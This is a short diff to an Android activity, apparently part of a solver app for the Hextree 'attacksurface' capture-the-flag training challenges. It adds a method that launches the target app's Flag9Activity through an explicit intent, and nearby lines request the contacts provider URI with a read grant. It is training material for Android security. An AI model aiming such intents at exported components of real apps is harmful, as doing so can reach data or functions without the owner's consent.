@@ -54,7 +54,7 @@ public class MainActivityHextree extends AppCompatActivity {
         sendIntentButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                flag6();
+                flag9();
             }
         });
     }
@@ -182,6 +182,12 @@ public class MainActivityHextree extends AppCompatActivity {
         intent.setData(Uri.parse("content://com.android.contacts/raw_contacts"));
         intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
         startActivityForResult(intent, 1);
+    }
+
+    private void flag9() {
+        Intent intent = new Intent();
+        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity");
+        startActivityForResult(intent, 9);
     }
 
     private void flag34() {
